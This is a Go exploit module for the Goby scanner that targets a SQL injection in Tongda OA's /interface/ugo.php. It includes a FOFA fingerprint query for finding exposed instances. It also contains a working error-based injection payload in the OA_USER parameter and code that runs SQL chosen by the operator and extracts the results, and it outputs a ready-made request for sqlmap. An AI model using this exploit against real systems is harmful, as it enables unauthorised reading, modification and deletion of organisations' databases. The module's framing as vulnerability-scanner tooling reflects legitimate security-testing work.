package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TongDa OA /interface/ugo.php SQL Injection Vulnerability",
    "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., LTD. It is a comprehensive management office platform formed by combining with the management practice of Chinese enterprises.​</p><p>The OA ugo.php interface has a SQL injection vulnerability, through which data in the database can be viewed, modified or even deleted, threatening the security of the system.</p>",
    "Product": "Tongda-OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2022-01-05",
    "PostTime": "2024-08-07",
    "Author": "hhh3156",
    "FofaQuery": "body=\"紧急通知：今日10点停电\" && body=\"您的电脑可能感染了病毒或木马程序，请联系OA软件开发商寻求解决办法或下载360安全卫士查杀\"",
    "GobyQuery": "body=\"紧急通知：今日10点停电\" && body=\"您的电脑可能感染了病毒或木马程序，请联系OA软件开发商寻求解决办法或下载360安全卫士查杀\"",
    "Level": "2",
    "Impact": "<p>The OA ugo.php interface has a SQL injection vulnerability, through which data in the database can be viewed, modified or even deleted, threatening the security of the system.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "(select database())",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "通达OA /interface/ugo.php SQL 注入漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。<br></p><p>通达OA ugo.php 接口存在一个 SQL 注入漏洞，通过这个漏洞可以查看、修改甚至删除数据库中的数据，威胁系统的安全性。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>通达OA&nbsp;ugo.php&nbsp;接口存在一个 SQL 注入漏洞，通过这个漏洞可以查看、修改甚至删除数据库中的数据，威胁系统的安全性。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TongDa OA /interface/ugo.php SQL Injection Vulnerability",
            "Product": "Tongda-OA",
            "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., LTD. It is a comprehensive management office platform formed by combining with the management practice of Chinese enterprises.​</p><p>The OA ugo.php interface has a SQL injection vulnerability, through which data in the database can be viewed, modified or even deleted, threatening the security of the system.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The OA ugo.php interface has a SQL injection vulnerability, through which data in the database can be viewed, modified or even deleted, threatening the security of the system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9924"
}`

	setSqlPayloadHash_pkwkMVL2398ALkdjuw1vm := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		urlget := `/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat(0x7c,(` + url.QueryEscape(sql) + `),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271`

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Referer":    hostInfo.FixedHostInfo,
		}
		resp, err = setGetRequest(hostInfo, urlget, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = urlget

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			MD5 := func(v string) string {
				d := []byte(v)
				m := md5.New()
				m.Write(d)
				return hex.EncodeToString(m.Sum(nil))
			}
			randomString := goutils.RandomHexString(8)

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := MD5(randomString)

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `select md5(%27` + randomString + `%27)`

			sendPayload := setSqlPayloadHash_pkwkMVL2398ALkdjuw1vm

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat(0x7c,(user()),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271 HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\n"

			// 2.配置正则语句，从响应包中提取出数据
			regular := `'\|([\s\S]*?)\|1'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_pkwkMVL2398ALkdjuw1vm
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
